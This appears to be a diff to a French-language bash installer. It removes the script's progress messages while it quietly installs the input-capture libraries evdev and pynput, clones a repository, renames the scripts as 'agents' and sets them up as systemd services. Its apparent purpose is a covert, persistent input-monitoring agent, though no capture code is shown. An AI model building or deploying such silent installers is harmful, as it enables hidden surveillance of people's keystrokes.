@@ -39,11 +39,8 @@ fi
 systemctl enable docker
 systemctl start docker
 
-
-echo "[*] Installation des dépendances Python..."
 pip3 install --upgrade evdev requests pynput &> /dev/null
 
-echo "[*] Clonage du dépôt : $REPO_URL -> $TEMP_DIR"
 rm -rf "$TEMP_DIR"
 git clone "$REPO_URL" "$TEMP_DIR" &> /dev/null
 if [[ $? -ne 0 ]]; then
@@ -51,7 +48,6 @@ if [[ $? -ne 0 ]]; then
   exit 1
 fi
 
-echo "[*] Déplacement et renommage des scripts..."
 
 
 if [[ -f "$TEMP_DIR/$SCRIPT_1" ]]; then
@@ -71,7 +67,7 @@ if [[ -f "$TEMP_DIR/$SCRIPT_3" ]]; then
   chmod +x "$INSTALL_DIR/$AGENT_3"
 fi
 
-echo "[*] Création des services systemd..."
+
 
 SERVICE_DIR="/etc/systemd/system"
 
